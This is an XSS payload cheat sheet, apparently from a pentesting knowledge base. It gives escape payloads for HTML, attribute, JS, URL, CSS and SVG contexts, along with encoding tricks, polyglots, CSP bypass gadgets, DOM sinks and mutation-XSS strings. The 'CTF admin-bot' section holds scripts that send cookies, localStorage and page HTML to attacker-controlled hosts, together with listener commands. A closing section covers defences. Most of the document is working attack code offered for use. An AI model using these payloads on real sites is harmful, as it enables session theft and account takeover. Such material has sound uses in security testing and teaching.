---
title: "XSS - Payloads by Injection Context, CSP Bypass and DOM Sinks"
category: web
subcategory: xss
type: cheatsheet
tags: [xss, cross-site-scripting, dom-xss, stored-xss, reflected-xss, mutation-xss, innerhtml, document-write, eval, settimeout, srcdoc, polyglot, csp-bypass, jsonp, strict-dynamic, trusted-types, admin-bot, headless-chrome, burp, interactsh]
summary: "Context-by-context escape payloads (HTML, attribute, JS string, URL, CSS, SVG), encoding variants, polyglots, CSP gadgets, admin-bot wiring and DOM sink reference."
tools: [burp, interactsh, puppeteer, playwright, dom-invader]
source:
  name: "PortSwigger - Cross-site scripting"
  url: "https://portswigger.net/web-security/cross-site-scripting"
related: [csp-bypass, dom-clobbering, command-injection-payloads]
---

## First: identify the context

```text
# Inject a unique marker that contains no dangerous chars, e.g.  zqx1
# then view-source (NOT the rendered DOM) and read where it landed:
#
#   <p>zqx1</p>                          -> HTML body text
#   <input value="zqx1">                 -> quoted attribute (double)
#   <input value='zqx1'>                 -> quoted attribute (single)
#   <input value=zqx1>                   -> unquoted attribute
#   <a href="zqx1">                      -> URL context
#   <script>var a = "zqx1";</script>     -> JS string literal
#   <script>var a = `zqx1`;</script>     -> JS template literal
#   <div style="width:zqx1">             -> CSS context
#   <!-- zqx1 -->                        -> HTML comment
#   <script>var o = {"k":"zqx1"}</script>-> JSON-in-script
#
# Then probe which chars survive:  zqx1'"<>`/\&{}();:=  and read the source again.
# The escape you need is exactly the set of chars that closes the current context.
```

## HTML body context

```html
<!-- the < starts a new tag, so any tag with a handler fires; img+onerror is the
     shortest reliable one because a bad src always errors -->
<img src=x onerror=alert(1)>

<!-- svg onload fires on parse, no broken resource needed, and survives many
     sanitisers that only blacklist img/script -->
<svg onload=alert(1)>

<!-- no parentheses (filters blocking "(" ): throw + onerror turns the thrown value
     into the argument, and alert is called as the error handler -->
<svg onload=window.onerror=eval;throw'=alert\x281\x29'>

<!-- details/open fires ontoggle immediately without user interaction -->
<details open ontoggle=alert(1)>

<!-- body/iframe/video/audio onerror-and-onload family: use when img and svg are filtered -->
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>

<!-- input autofocus: onfocus fires as soon as the element is focused, and autofocus
     does the focusing for you -- the classic "no script tag needed" payload -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

<!-- marquee/animate: SVG SMIL handlers that many sanitiser allowlists forgot -->
<marquee onstart=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- plain script tag: only works when < and > pass through AND the sink is not
     innerHTML (HTML5 will not execute a script inserted via innerHTML) -->
<script>alert(1)</script>

<!-- breaking out of a plain text node inside an existing tag -->
</textarea><script>alert(1)</script>
</title><script>alert(1)</script>
</noscript><script>alert(1)</script>
</style><script>alert(1)</script>
<!-- these matter because textarea/title/style/noscript are RAWTEXT or RCDATA
     elements: the parser ignores < inside them until the matching close tag -->

<!-- comment breakout: --> ends the comment and returns the parser to data state -->
--><script>alert(1)</script><!--
```

## Quoted attribute context

```html
<!-- target: <input value="INJECT">  -- close the quote, close the tag, start a new one -->
"><img src=x onerror=alert(1)>

<!-- single-quote variant: <input value='INJECT'> -->
'><img src=x onerror=alert(1)>

<!-- stay inside the SAME tag: close only the quote and add a handler. Works when
     > is filtered, because the parser accepts a new attribute after whitespace -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)

<!-- no-space variant for filters stripping spaces: / is a valid attribute separator
     in the HTML tokeniser -->
"/onfocus="alert(1)"autofocus="

<!-- when the app HTML-escapes " but the attribute is inside a JS-generated string
     later re-parsed, &quot; can still close it after one decode round -->
&quot;&gt;<img src=x onerror=alert(1)>

<!-- attribute value that becomes code without any escape: the href/src/action
     family accepts javascript: URLs directly -->
javascript:alert(1)

<!-- event handlers are HTML-entity decoded before JS parsing, so an entity-encoded
     payload inside a handler still runs -->
" onclick="&#97;&#108;&#101;&#114;&#116;&#40;1&#41;
```

## Unquoted attribute context

```html
<!-- target: <input value=INJECT>  -- no quote to escape: whitespace ends the value
     and everything after is parsed as a new attribute -->
x onmouseover=alert(1)
x autofocus onfocus=alert(1)

<!-- tab/newline/form-feed are all attribute separators too, for space filters -->
x%09onfocus=alert(1)%09autofocus
x%0aonfocus=alert(1)%0aautofocus
x%0confocus=alert(1)%0cautofocus

<!-- backtick trick: old IE and some sanitisers treat ` as a quote char; modern
     parsers treat it as part of the value, so it survives quote-stripping filters -->
x`onmouseover=alert(1)

<!-- close the tag outright when > survives -->
x><script>alert(1)</script>
```

## JavaScript string literal context

```javascript
// target: var a = "INJECT";  -- close the string, end the statement, run code,
// then comment out or re-open the trailing quote so the file still parses
";alert(1);//
';alert(1);//
";alert(1);"
';alert(1);'

// the string is inside an HTML <script> block, which is RAWTEXT: the HTML tokeniser
// scans for the literal </script and ends the block there -- regardless of JS quoting.
// So this works even when quotes are escaped:
</script><script>alert(1)</script>

// no-quote payload for when ' and " are escaped to \' \" -- build the string from
// character codes instead
;alert(String.fromCharCode(88,83,83));//

// backslash-eating: if the app escapes " as \" but does NOT escape \, then sending
// \" produces \\" -- the backslash escapes itself and your quote closes the string
\";alert(1);//

// inside a single-line comment sink: a newline ends the comment
%0aalert(1)//

// inside a function argument: close the paren and chain
");alert(1);//
')-alert(1)-('
```

## JavaScript template literal context

```javascript
// target: var a = `INJECT`;  -- ${} is evaluated inside the literal, so you need
// NO quote break at all. This is why template literals are the easiest JS context.
${alert(1)}

// works even when ' " and ; are all filtered
${alert`1`}

// nested template: backtick call syntax passes the literal as the first argument,
// so no parentheses are required
${eval`alert\x281\x29`}

// breaking out entirely when ${ is filtered
`;alert(1);//
`-alert(1)-`
```

## URL context

```text
# target: <a href="INJECT"> or location = INJECT or window.open(INJECT)

javascript:alert(1)                  # the URL scheme itself is the code; the browser
                                     # evaluates the rest as JS in the current origin
javascript:alert(document.domain)    # confirms WHICH origin you are executing in

JaVaScRiPt:alert(1)                  # scheme matching is case-insensitive
java\tscript:alert(1)                # tab/newline/CR inside the scheme are stripped
java%09script:alert(1)               # by the URL parser before scheme comparison
java%0ascript:alert(1)
java%0dscript:alert(1)
%20javascript:alert(1)               # leading whitespace is trimmed
&#106;avascript:alert(1)             # HTML-entity decoded in an href before URL parsing

data:text/html,<script>alert(1)</script>              # data: URL, own opaque origin
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

vbscript:msgbox(1)                   # legacy IE only, still seen in CTFs
//attacker.tld                       # protocol-relative -> open redirect, not XSS
```

## CSS context

```css
/* target: <div style="width:INJECT">  -- close the property, close the attribute,
   then inject a tag as usual */
x"><img src=x onerror=alert(1)>

/* expression() was IE-only and is dead in modern browsers -- listed because CTF
   challenges still emulate old engines */
width:expression(alert(1))

/* CSS cannot execute JS in a modern browser, but it CAN exfiltrate: an attribute
   selector fires a background request only when the prefix matches, leaking a
   token character by character */
input[name=csrf][value^="a"]{background:url(https://x.oast.fun/a)}
input[name=csrf][value^="b"]{background:url(https://x.oast.fun/b)}

/* @import pulls the next round of selectors, enabling a recursive char-by-char
   exfiltration loop without any JS */
@import url(https://attacker.tld/round2.css);

/* font-face + unicode-range leaks WHICH characters are rendered on the page */
@font-face{font-family:x;src:url(https://x.oast.fun/A);unicode-range:U+0041}
```

## SVG context

```html
<!-- SVG is XML embedded in HTML: it gets its own element set, and sanitiser
     allowlists frequently forget these -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>

<!-- inside an SVG, character data is XML-parsed, so entities are decoded BEFORE
     JS parsing -- this bypasses filters that scan for the literal string "alert" -->
<svg><script>&#97;lert(1)</script></svg>
<svg><script>a&#108;ert&#40;1&#41;</script></svg>

<!-- SMIL animation handlers: onbegin/onend/onrepeat fire on the animation timeline -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x dur=1s>

<!-- foreignObject re-enters HTML parsing inside the SVG subtree -->
<svg><foreignObject><iframe src=javascript:alert(1)></foreignObject></svg>

<!-- use/href can pull an external SVG fragment -->
<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz48aW1hZ2UgaHJlZj0neCcgb25lcnJvcj0nYWxlcnQoMSknLz48L3N2Zz4=#x"/></svg>

<!-- a standalone .svg FILE served with image/svg+xml executes when opened directly
     -- the classic file-upload-to-XSS path -->
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

## Event handlers worth trying

```text
# fire with no user interaction (best first choice)
onload onerror onbegin ontoggle onpageshow onfocus(+autofocus) onanimationstart
onanimationend onanimationiteration ontransitionend onplay onloadstart onloadeddata
onscrollend oncanplay onratechange onvolumechange onresize onbeforescriptexecute

# fire on trivial interaction (fine for an admin bot that moves the mouse, or when
# you can style the element to cover the viewport)
onmouseover onmousemove onmouseenter onclick onpointerover onpointerenter onwheel
onauxclick oncontextmenu ondblclick ondrag ondrop

# fire on form/text interaction
oninput onchange onselect onsearch onsubmit onreset oninvalid oncut oncopy onpaste

# CSS-driven, no JS event needed to originate it
onanimationstart with  style="animation-name:x"  + @keyframes x{}

# to cover the whole page so any mouse movement triggers it:
<div style="position:fixed;top:0;left:0;width:100vw;height:100vh" onmouseover=alert(1)></div>
```

## Encoding variants

```text
# HTML entities -- decoded by the HTML parser before the value reaches JS.
# Works inside event handlers and href, NOT inside <script> blocks.
&lt;  &#60;  &#x3c;  &#0000060;                 all decode to <
&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;   alert(1)
&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;
# entity forms without the trailing semicolon still decode in attribute values
&#97&#108&#101&#114&#116&#40 1&#41

# JS unicode escapes -- decoded by the JS parser, so they work inside <script>
# but NOT inside an HTML attribute that is never JS-parsed
alert(1)
\x61lert(1)
eval('\x61lert\x281\x29')
# \u{...} form (ES6)
\u{61}lert(1)

# URL encoding -- decoded by the server or by the URL parser
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253E            # double-encoded: survives one decode by a proxy/WAF,
                            # the app decodes a second time and gets <script>

# UTF-16 / non-ASCII quote homoglyphs that some sanitisers normalise INTO real quotes
%EF%BC%9C   # fullwidth <   U+FF1C -- becomes < after NFKC normalisation
%EF%BC%87   # fullwidth '   U+FF07

# base64 indirection -- for filters scanning for the literal "alert"
eval(atob('YWxlcnQoMSk='))
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

# String.fromCharCode when quotes are gone
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

# no-alphanumeric JSFuck-style (works because [] + ! ( ) coerce into every char)
[][(![]+[])[+[]]]   # a fragment; the full generator is at jsfuck.com
```

## Polyglots

```text
# A polyglot is one string that escapes SEVERAL contexts at once, so a single
# submission tells you "something fired" without knowing the context first.
# Use them for discovery, then switch to a minimal context-specific payload.
```

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```text
# why the above works, piece by piece:
#   jaVasCript:      handles the href/URL context
#   /*-/*`/*\`/*'/*"/**/   opens a JS comment that stays valid whether the
#                    surrounding literal used ' " or ` -- it neutralises the break-out
#   oNcliCk=alert()  handles the attribute context (mixed case defeats regex filters)
#   //%0D%0A         ends a single-line-comment sink with a real CRLF
#   </stYle/</titLe/</teXtarEa/</scRipt/   closes every RAWTEXT/RCDATA element
#   --!>             closes an HTML comment (the bang form is accepted by the parser)
#   \x3csVg/oNloAd=alert()   the actual payload, with < written as \x3c so a JS
#                    string context also produces a real <
```

```text
'"><img src=x onerror=alert(1)>            # short 2-context probe: quoted attr + body
"onmouseover=alert(1)//                    # attribute, no > needed
'-alert(1)-'                               # JS string in a subtraction, keeps syntax valid
\'-alert(1)//                              # backslash-eating variant
</script><svg onload=alert(1)>             # JS-in-HTML + body
```

## CSP bypass gadgets

```text
# Read the policy first:  curl -sI https://target | grep -i content-security-policy
# Then find which directive is the weak one. The gadget follows from the gap.
```

```html
<!-- 1. JSONP endpoint on an allowlisted host: script-src allows the host, and the
     endpoint reflects your callback name into executable JS. Your payload is the
     callback name, so the allowlisted host serves your code. -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://allowed.cdn/api/jsonp?callback=alert(1)"></script>

<!-- 2. 'unsafe-eval': the policy blocks inline <script> but still lets any allowed
     script turn a string into code. Find a sink already on the page (a templating
     library, a router, angular) and feed it your string. -->
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
<script src="https://allowed.cdn/angular.min.js"></script>

<!-- 3. missing base-uri: a relative <script src="/app.js"> resolves against <base>.
     Inject a base tag and every relative script on the page is fetched from you. -->
<base href="https://attacker.tld/">

<!-- 4. 'strict-dynamic': any script the browser trusted may create more scripts, and
     the allowlist is IGNORED once strict-dynamic is present. If an allowlisted script
     does document.createElement('script'); s.src = <attacker-controlled>, the child
     inherits trust. Common gadget: a script that copies a URL parameter into a src. -->
<script src="https://allowed.cdn/loader.js" data-src="https://attacker.tld/x.js"></script>

<!-- 5. an allowlisted CDN that serves arbitrary user content (unpkg, jsdelivr, a
     public S3 bucket) -- you upload the script, the CSP allows the host -->
<script src="https://cdn.jsdelivr.net/gh/attacker/repo@main/x.js"></script>

<!-- 6. wildcard or scheme-only source: script-src * / https: / data: allows anything -->
<script src="data:text/javascript,alert(1)"></script>

<!-- 7. nonce reuse: if the same nonce is served on a cached page, or if the nonce
     appears in a reflected parameter, copy it into your injected tag -->
<script nonce="COPY_THE_NONCE_FROM_THE_PAGE">alert(1)</script>

<!-- 8. dangling-markup exfiltration when script execution is truly blocked: an
     unclosed attribute swallows the page source up to the next quote and sends it
     in the URL. Needs a lax img-src/default-src. -->
<img src="https://x.oast.fun/?

<!-- 9. no object-src / no frame-src: fall back to a plugin or a framed data: URL -->
<object data="data:text/html,<script>alert(1)</script>"></object>

<!-- 10. CSP does not stop navigation unless form-action / frame-ancestors are set:
     exfiltrate via a form submit or a top-level redirect -->
<form action="https://attacker.tld/" method="POST" id=f><input name=d value="DATA"></form><script>f.submit()</script>
```

```text
# check a policy mechanically rather than by eye:
#   https://csp-evaluator.withgoogle.com/     (paste the header)
# and look specifically for:
#   object-src not set        -> <object data=...> path open
#   base-uri not set          -> <base> gadget open
#   unsafe-inline in script-src -> the policy does essentially nothing
#   unsafe-eval               -> library gadgets open
#   an allowlisted host with JSONP or user uploads -> game over
```

## CTF admin-bot challenges

```text
# How these are wired, almost always:
#   1. The challenge has a "report to admin" / "submit URL" form.
#   2. A backend worker launches headless Chromium (puppeteer or playwright).
#   3. The bot sets the flag as a cookie on the challenge origin, or visits a page
#      that puts the flag in localStorage / the DOM, then navigates to YOUR url.
#   4. Your XSS runs as the bot, in the challenge origin, and must send the flag out.
#
# Read the provided bot source if you get it: it tells you
#   - the cookie name, and whether it is httpOnly (if yes, you need the flag from the
#     DOM or from an authenticated fetch, not document.cookie)
#   - SameSite (Lax means your top-level navigation still sends it; None means
#     even an iframe/fetch does)
#   - the timeout (usually 5-30s) -- your exfil must complete inside it
#   - whether the URL is restricted to the challenge origin (then you need a
#     same-origin reflected sink, not an attacker-hosted page)
```

```javascript
// exfil 1: image beacon. Simplest, fires even if the page unloads, no CORS involved
// because an image request is not a cross-origin READ.
new Image().src='https://x.oast.fun/?c='+encodeURIComponent(document.cookie);

// exfil 2: fetch with keepalive, survives navigation away from the page
fetch('https://x.oast.fun/',{method:'POST',mode:'no-cors',keepalive:true,body:document.cookie});

// exfil 3: navigation -- guaranteed delivery, but ends the bot's session
location='https://x.oast.fun/?c='+encodeURIComponent(document.cookie);

// exfil 4: the flag is httpOnly -> you cannot read the cookie, so make an
// authenticated request AS the bot and exfiltrate the response body instead
fetch('/flag',{credentials:'include'}).then(r=>r.text())
  .then(t=>navigator.sendBeacon('https://x.oast.fun/',t));

// exfil 5: the flag is in localStorage or the DOM
new Image().src='https://x.oast.fun/?f='+encodeURIComponent(localStorage.getItem('flag'));
new Image().src='https://x.oast.fun/?f='+btoa(document.documentElement.innerHTML);

// exfil 6: long values -- URLs get truncated. Chunk it, or base64 and POST it.
const d=btoa(document.documentElement.innerHTML);
for(let i=0;i<d.length;i+=500)new Image().src='https://x.oast.fun/?i='+i+'&d='+encodeURIComponent(d.slice(i,i+500));
```

```bash
# listeners you control -- pick one and keep it running
interactsh-client -v                          # DNS + HTTP, gives you a subdomain
python3 -m http.server 8000                   # local, then expose it
ngrok http 8000                               # public tunnel to the local server
nc -lvnp 8000                                 # raw, shows the full request line
# Burp Collaborator (Burp Suite > Collaborator > Copy to clipboard) also works and
# captures DNS lookups even when outbound HTTP is blocked.
```

```javascript
// a self-contained payload host page: serve this at https://attacker.tld/x.js and
// point the bot at a page that loads it, or inline the body directly
(function(){
  var out = 'cookie=' + document.cookie
          + '&url=' + location.href
          + '&ls=' + JSON.stringify(localStorage);
  new Image().src = 'https://x.oast.fun/?' + encodeURIComponent(out);
})();
```

## DOM sink reference

```javascript
// --- sinks that parse HTML (a string becomes markup) ---
el.innerHTML = s;            // <script> inserted this way does NOT run, but
                             // <img onerror> and <svg onload> DO -- the handler is
                             // an attribute, not a script element
el.outerHTML = s;
el.insertAdjacentHTML('beforeend', s);
document.write(s);           // runs <script> too, because it feeds the HTML parser
                             // directly during document load
document.writeln(s);
el.srcdoc = s;               // iframe srcdoc: a whole new document, own parser,
                             // inherits the parent origin
$(s);                        // jQuery: a string starting with < is parsed as HTML
$(el).html(s); $(el).append(s); $(el).before(s); $(el).after(s); $(el).wrap(s);
new DOMParser().parseFromString(s,'text/html');   // safe alone; unsafe once adopted
range.createContextualFragment(s);
el.setHTML(s);               // sanitised by spec -- the safe one

// --- sinks that execute a string as code ---
eval(s);
Function(s)();               // same as eval with a fresh scope
new Function('return '+s)();
setTimeout(s, 0);            // string form only -- setTimeout(fn,0) is safe
setInterval(s, 0);
setImmediate(s);
execScript(s);               // legacy IE
window.constructor.constructor(s)();   // the Function constructor via any object
el.setAttribute('onclick', s);         // becomes code when the event fires

// --- sinks that navigate (javascript: URLs execute) ---
location = s; location.href = s; location.assign(s); location.replace(s);
window.open(s);
el.href = s; el.src = s; el.action = s; el.formaction = s; el.data = s;
history.pushState(0,0,s);    // not directly XSS, but poisons a later location read

// --- sinks that inject CSS (exfiltration, not execution) ---
el.style.cssText = s;  el.style.background = s;  styleSheet.insertRule(s);

// --- sources: where attacker data enters the DOM ---
location.href location.search location.hash location.pathname
document.URL document.documentURI document.baseURI document.referrer
window.name                  // survives cross-origin navigation -- a classic carrier
document.cookie
localStorage sessionStorage
postMessage event.data       // check event.origin, or anyone can send it
XMLHttpRequest / fetch response bodies rendered without escaping
WebSocket onmessage data

// --- a minimal DOM XSS to look for in source ---
// document.write(location.hash.slice(1))          -> #<img src=x onerror=alert(1)>
// el.innerHTML = new URLSearchParams(location.search).get('q')
// eval('var x = ' + decodeURIComponent(location.hash.slice(1)))
```

```text
# tooling: Burp's DOM Invader (built into Burp's embedded browser) traces a canary
# string from every source to every sink and tells you the exact stack. Enable it,
# set the canary, load the page, and read the "sinks" panel.
```

## Mutation XSS (mXSS)

```html
<!-- The sanitiser parses the string one way; the browser re-serialises and re-parses
     it, and the SECOND parse produces different markup. DOMPurify-class bypasses
     live here. -->

<!-- namespace confusion: inside <svg>, the parser switches to the SVG namespace;
     <style> content is then re-parsed as HTML on serialisation -->
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">

<!-- unclosed attribute inside a nested foreign-content element -->
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>

<!-- form/table reparenting: the HTML parser relocates nodes that are illegal in
     their parent, so the sanitised tree is not the rendered tree -->
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

## Defence

```text
# 1. ENCODE FOR THE CONTEXT. There is no single "escape function" -- the escaping is
#    only correct for the parser that receives it.
#
#    HTML body        ->  & < > escaped as &amp; &lt; &gt;
#    HTML attribute   ->  additionally " ' escaped, and ALWAYS quote the attribute
#    JS string        ->  \xHH escape everything non-alphanumeric; never build JS by
#                         concatenation. Emit data as JSON in a
#                         <script type="application/json"> block and JSON.parse it.
#    URL              ->  encodeURIComponent for the value, and validate the SCHEME
#                         against an allowlist (http/https only) -- encoding alone
#                         does not stop javascript:
#    CSS              ->  allowlist the property AND the value; never interpolate
#                         a URL from input
#
# 2. Prefer textContent over innerHTML. textContent cannot create nodes, so there is
#    no parser to confuse.
#
# 3. Use a real templating engine with auto-escaping ON and never reach for its
#    raw/unsafe helper:
#      Django {{ }} (auto), and NOT |safe / mark_safe
#      Jinja2 with autoescape=True, and NOT |safe
#      React {expr} (auto), and NOT dangerouslySetInnerHTML
#      Vue {{ }} (auto), and NOT v-html
#      Angular interpolation (auto), and NOT bypassSecurityTrustHtml
#      Go html/template (context-aware -- it escapes per context automatically)
#
# 4. Sanitise only when you must render user HTML, and only with a maintained,
#    parser-accurate library. Keep it current: mXSS bypasses are patched regularly.
#      DOMPurify.sanitize(dirty)            (client)
#      the Sanitizer API / Element.setHTML  (native, spec-defined)
#      Bleach (Python), sanitize-html (Node), HtmlSanitizer (.NET)
#    A regex or a blacklist of tag names is not a sanitiser.
```

```javascript
// 5. Trusted Types: makes the dangerous sinks refuse plain strings at runtime.
//    With require-trusted-types-for 'script', assigning a string to innerHTML throws,
//    so every injection sink must go through a named policy you audited.
//    Header:  Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app
const policy = trustedTypes.createPolicy('app', {
  createHTML: (s) => DOMPurify.sanitize(s),          // one audited chokepoint
  createScriptURL: (s) => {
    const u = new URL(s, location.origin);
    if (u.origin !== location.origin) throw new TypeError('blocked');
    return u.href;
  }
});
el.innerHTML = policy.createHTML(userInput);   // the only way innerHTML now works
```

```text
# 6. CSP that actually closes the gadgets above -- nonce + strict-dynamic, and the
#    two directives everyone forgets:
#
#    Content-Security-Policy:
#      script-src 'nonce-{random-per-response}' 'strict-dynamic' https: 'unsafe-inline';
#      object-src 'none';          <- closes the <object data=...> gadget
#      base-uri 'none';            <- closes the <base href> gadget
#      require-trusted-types-for 'script';
#      frame-ancestors 'none';
#      form-action 'self';         <- closes the form-submit exfil
#
#    ('unsafe-inline' is a deliberate fallback for old browsers -- a browser that
#     understands nonces ignores it. https: is the fallback for pre-strict-dynamic
#     browsers and is likewise ignored where strict-dynamic is supported.)
#
#    The nonce must be fresh, unguessable (>=128 bits from a CSPRNG) and per-RESPONSE.
#    A static nonce, or one on a cached page, is the same as 'unsafe-inline'.
#
# 7. Cookie hygiene shrinks the payoff: HttpOnly stops document.cookie theft,
#    Secure stops plaintext capture, SameSite=Lax/Strict limits cross-site delivery.
#    None of these stop the XSS -- they stop one exfil channel.
#
# 8. Uploads: serve user files from a separate origin, with
#    Content-Disposition: attachment and X-Content-Type-Options: nosniff, so an
#    uploaded .svg or .html can never execute in the app's origin.
```

## References

- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- https://portswigger.net/web-security/cross-site-scripting
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://portswigger.net/web-security/content-security-policy
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
